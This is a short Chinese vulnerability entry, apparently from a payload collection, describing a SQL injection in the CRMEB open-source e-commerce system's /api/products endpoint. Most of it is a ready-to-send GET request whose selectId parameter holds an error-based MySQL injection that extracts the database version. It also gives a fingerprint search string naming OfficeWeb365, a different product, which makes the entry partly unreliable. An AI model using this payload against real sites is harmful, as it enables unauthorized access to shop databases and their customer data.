# CRMEB开源电商系统productsSQL注入漏洞

CRMEB ｜ SQL注入 ｜ —
- **指纹**：`header="OfficeWeb365"`
- **请求**：`GET /api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,version()))),0x7e),3550) HTTP/1.1`